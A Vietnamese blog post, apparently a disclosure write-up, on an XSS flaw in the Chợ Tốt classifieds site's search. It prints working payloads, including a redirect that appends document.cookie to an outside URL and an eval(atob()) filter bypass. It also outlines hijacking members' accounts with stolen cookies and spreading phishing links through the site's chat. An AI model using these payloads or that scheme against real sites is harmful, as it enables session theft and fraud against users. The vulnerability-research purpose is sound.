---
layout: post
title: Tôi đã hack Chợ Tốt như thế nào
---

Hôm nay thử dạo một vòng Chợ Tốt kiếm mấy món hàng cũ, thì phát hiện lỗi XSS, đây là lỗi không mới, cách thức tấn công cũng đơn giản, nhưng nhiều khi cần rất nhiều sáng tạo trong quá trình khai thác.

Thử tìm kiếm với từ khóa "iphone 7" thì thấy như thế này:

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/mh0excozyx_c1.png)

Ai chà, url đẹp phết, mình thích url này rồi đấy, search key đã được bỏ dấu và thêm dấu gạch ngang cho hợp chuẩn. Thử thêm một ít html vào xem sao:

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/xq1tymmaf1_c2.png)

Rất nhiều nơi, search key đã được entities, tuy nhiên vì lý do nào đó, search key trong đoạn javascript này đã không được xử lý.
Vấn đề là, từ khóa nó đang nằm trong string, nên alert không xảy ra hiện tượng gì. 

Cuối cùng mình sửa search key như sau:

{% highlight javascript %}
iphone 7" }; alert("something went wrong"); var a = { "a":"
{% endhighlight %}

Thì nhận được alert:

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/sk8bcvtkaw_c3.png)

Bạn thấy không? Mình muốn nói đến cái search key trên, từ một property của object, nó đã tách thành 2 object, và alert nằm giữa một cách đẹp đẽ và tuyệt vời.

OK, giờ thử redrect đến 1 trang ngoài cùng với cookie của người dùng xem sao, mình thử code này:

```javascript
iphone 7" }; window.location="http://google.com/" + document.cookie; var a = { "a":"
```

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/o7l9sidows_c4.png)

Cái lề gì thốn, coder đã cẩn thận bỏ dấu gạch chéo // và phần sau của search key đi, cũng như lọc một số từ đặc biệt trong chuỗi, như vậy là không thể tương tác gì url bên ngoài được? Không, phải nghĩ cách khác. Cuối cùng thì mình đã tìm ra cách hoàn hảo nhất là đây:

```javascript
iphone 7" }; eval(atob("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")); var a = { "a":"
```

Với xxxxx là mã hóa base64 của một đoạn code javascript bất kỳ, tức là chúng ta có thể chèn bất kỳ đoạn javascript nào vào Chợ Tốt. Ví dụ sau đây để alert cookie:

```javascript
iphone 7" }; eval(atob("YWxlcnQoIGRvY3VtZW50LmNvb2tpZSk=")); var a = { "a":"
```

Và đây là kết quả:

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/t9g7rdgqhh_9.png)

Đã đến bước này, thì các bạn đã biết mình sẽ làm gì tiếp theo rồi phải không? Mình đăng 1 bài viết mua bán với giá rất rẻ, trong đó có kèm link, lấy cookie để vào được tài khoản của những người không may click vào link.

Nhưng không dừng lại ở đó, khi đã vào được tài khoản của vài thành viên khác, mình có thể mở rộng hơn qua chính công cụ chat của Chợ Tốt bằng tokenKey đã lấy được. Viết script tự động chat với nhiều thành viên khác với nội dung bán đồ rất rẻ, và kèm link để câu.

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/j5w20u6nil_c6.png)

Tâm lý là khi được chat về sản phẩm đang bán, người dùng rất dễ click vào link, social engineering khá hiệu quả trong trường hợp này.

Hiện tại mình đã report với Chợ Tốt, nhưng họ có vẻ không quan tâm lắm, chỉ nói chung chung là sẽ kiểm tra.

Mình sẽ update tình hình lên bài viết này.

> Update 1: 
> Mình đã gửi report đến Chợ Tốt, và sau 10 tiếng nhận lại được 1 email phản hồi yêu cầu mô tả tái hiện lỗi, mình đã gửi lại và chưa nhận được hồi đáp. Lỗi chưa được fix.
> 
> Update 2:
> Đến 15h ngày 23/11: Lỗi đã được lẳng lặng fix bằng một cách củ chuối là: remove ký tự đóng mở ngoặc đơn () trong search key, vẫn có thể bypass được,  chưa có thông báo gì đến mình, tất cả là một email chung chung.

